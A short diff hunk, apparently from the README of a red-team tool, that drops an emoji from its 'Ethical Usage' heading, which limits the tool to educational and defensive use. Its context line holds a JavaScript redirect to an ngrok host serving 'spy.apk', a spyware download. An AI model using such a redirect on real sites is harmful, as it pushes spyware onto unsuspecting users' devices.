@@ -162,7 +162,7 @@ window.location.href = "https://pwn-tag.ngrok.app/payloads/spy.apk";
 
 ---
 
-## 🛡 Ethical Usage
+## Ethical Usage
 
 This tool is intended for **educational use, red team simulation, and defense research only.**
 Do not deploy it against real targets without consent. You are responsible for your actions.
